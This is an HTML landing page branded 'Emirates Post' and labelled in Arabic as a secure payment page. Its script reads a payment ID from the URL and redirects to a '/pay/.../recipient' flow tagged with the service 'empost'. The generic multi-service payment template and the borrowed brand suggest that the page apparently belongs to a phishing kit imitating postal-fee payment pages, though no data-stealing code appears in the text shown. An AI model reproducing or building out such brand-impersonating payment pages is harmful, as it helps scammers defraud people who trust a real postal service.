<body>
    <div id="root" style="text-align: center; padding: 100px 20px; font-family: 'Almarai', sans-serif;">
        <h1>البريد الإماراتي - Emirates Post</h1>
        <p>صفحة دفع آمنة</p>
    </div>
    <script>
        // Get service from filename
        const service = 'empost';
        const urlParams = new URLSearchParams(window.location.search);
        let payId = urlParams.get('payId') || '';

        // If payId not in query, check path (for /pay/empost.html structure)
        if (!payId) {
            const path = window.location.pathname;
            const payMatch = path.match(/\/pay\/([^\/\.]+)/);
            payId = payMatch ? payMatch[1] : '';
        }

        if (payId) {
            window.location.href = `/pay/${payId}/recipient?service=${service}`;
        } else {
            window.location.href = `/pay/`;
        }
    </script>
    <script type="module" src="/src/main.tsx"></script>
</body>
</html>
